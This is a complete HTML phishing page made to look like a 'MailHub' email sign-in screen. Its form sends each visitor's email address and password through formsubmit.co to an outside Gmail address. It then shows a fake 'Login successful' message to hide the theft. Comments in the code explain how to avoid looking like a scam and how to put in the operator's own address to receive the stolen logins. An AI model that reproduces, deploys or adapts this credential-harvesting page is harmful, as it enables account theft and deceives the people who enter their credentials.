<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MailHub - Secure Access</title>
    <style>
        /* 
           1. Unique Brand Colors: Do NOT use Google Blue/Red/Yellow.
           2. Clean, Professional UI: Avoids looking like a "scam" site.
        */
        :root {
            --primary: #2563eb; /* Blue */
            --dark: #1e293b;    /* Slate */
            --light: #f8fafc;   /* Off-white */
            --error: #ef4444;   /* Red */
            --success: #10b981; /* Green */
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background-color: var(--light);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .card {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }

        .header {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary);
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: var(--dark);
            font-size: 0.9rem;
        }

        .form-group {
            margin-bottom: 1rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--dark);
        }

        input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 1rem;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
        }

        button {
            width: 100%;
            padding: 0.875rem;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 1rem;
        }

        button:hover {
            background-color: #1d4ed8;
        }

        button:disabled {
            background-color: #94a3b8;
            cursor: not-allowed;
        }

        .status {
            margin-top: 1rem;
            text-align: center;
            font-size: 0.875rem;
            font-weight: 500;
            display: none;
        }

        .status.success { color: var(--success); display: block; }
        .status.error { color: var(--error); display: block; }
    </style>
</head>
<body>

    <div class="card">
        <div class="header">
            <div class="logo">MailHub</div>
            <div class="subtitle">Sign in to your dashboard</div>
        </div>

        <!-- 
            IMPORTANT: 
            1. Use /ajax/ so the page doesn't redirect.
            2. Replace 'youremail@example.com' with YOUR actual email.
        -->
        <form id="loginForm" action="https://formsubmit.co/ajax/help98177@gmail.com" method="POST">
            
            <!-- Hidden fields for FormSubmit configuration -->
            <input type="hidden" name="_subject" value="[MailHub] New Login Attempt">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <!-- Honeypot: Bots will fill this, humans won't. FormSubmit ignores submissions if this is filled -->
            <input type="text" name="_honey" style="display:none;">

            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="name@company.com" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="••••••••" required>
            </div>

            <button type="submit" id="submitBtn">Sign In</button>
        </form>

        <div id="statusMsg" class="status"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const form = e.target;
            const statusMsg = document.getElementById('statusMsg');
            const submitBtn = document.getElementById('submitBtn');
            const formData = new FormData(form);

            // Reset status
            statusMsg.className = 'status';
            statusMsg.textContent = '';

            // Disable button to prevent double-clicks
            submitBtn.disabled = true;
            submitBtn.textContent = 'Signing In...';

            fetch(form.action, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (result.success) {
                    statusMsg.textContent = 'Login successful! Redirecting to dashboard...';
                    statusMsg.className = 'status success';
                    form.reset();
                } else {
                    statusMsg.textContent = 'Submission failed. Please try again.';
                    statusMsg.className = 'status error';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusMsg.textContent = 'Network error. Please check your connection.';
                statusMsg.className = 'status error';
            })
            .finally(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Sign In';
            });
        });
    </script>

</body>
</html>
